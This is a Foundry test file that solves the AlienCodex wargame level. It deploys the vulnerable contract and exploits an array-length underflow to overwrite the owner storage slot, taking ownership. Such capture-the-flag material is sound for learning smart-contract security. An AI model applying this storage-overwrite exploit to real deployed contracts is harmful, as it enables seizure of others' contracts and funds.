// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract AlienCodexTest is Test {
    AlienCodex target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        // NOTE: since this is a v0.5.0 specific contract, we should get the bytecode and deploy it via CREATE here,
        // forge will automatically compile it with v0.5.17 and the artifact will be under `out` as shown below
        bytes memory bytecode = abi.encodePacked(vm.getCode("./out/AlienCodex.sol/AlienCodex.json"));
        address addr;
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        target = AlienCodex(addr);
    }

    function attack() private {
        // this is required to get past the modifier
        target.makeContact();

        // cause an underflow by calling retract
        target.retract();

        // become the owner by cleverly overriding the owner slot
        uint256 slot = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
        bytes32 addrBytes = bytes32(abi.encode(address(player)));
        target.revise(slot, addrBytes);
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(target.owner(), player, "player must be the owner");
    }
}

interface AlienCodex {
    function owner() external view returns (address);

    function makeContact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}
